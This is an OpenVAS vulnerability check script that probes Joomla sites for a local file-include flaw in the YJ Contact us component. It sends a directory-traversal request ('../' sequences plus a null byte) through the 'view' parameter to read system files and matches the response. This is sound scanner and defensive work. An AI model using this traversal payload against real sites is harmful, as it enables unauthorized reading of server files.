###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_50362.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Joomla YJ Contact us Component 'view' Parameter Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "YJ Contact us component for Joomla! is prone to a local file-
include vulnerability because it fails to properly sanitize user-
supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and execute arbitrary local scripts in the
context of the webserver process. This may allow the attacker to
compromise the application and the computer; other attacks are
also possible.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103315");
 script_version("$Revision: 9351 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-10-26 13:58:20 +0200 (Wed, 26 Oct 2011)");
 script_bugtraq_id(50362);
 script_tag(name:"cvss_base", value:"5.1");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_name("Joomla YJ Contact us Component 'view' Parameter Local File Include Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50362");
 script_xref(name : "URL" , value : "http://joomla1.5.youjoomla.info/yjcontact/index.php");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("joomla_detect.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("joomla/installed");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if( ! dir = get_dir_from_kb(port:port, app:"joomla"))exit(0);
files = traversal_files();

foreach file (keys(files)) {

  url = string(dir, "/index.php?option=com_yjcontactus&view=",crap(data:"../", length:6*9),files[file],"%00"); 

  if(http_vuln_check(port:port, url:url, pattern:file)) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);
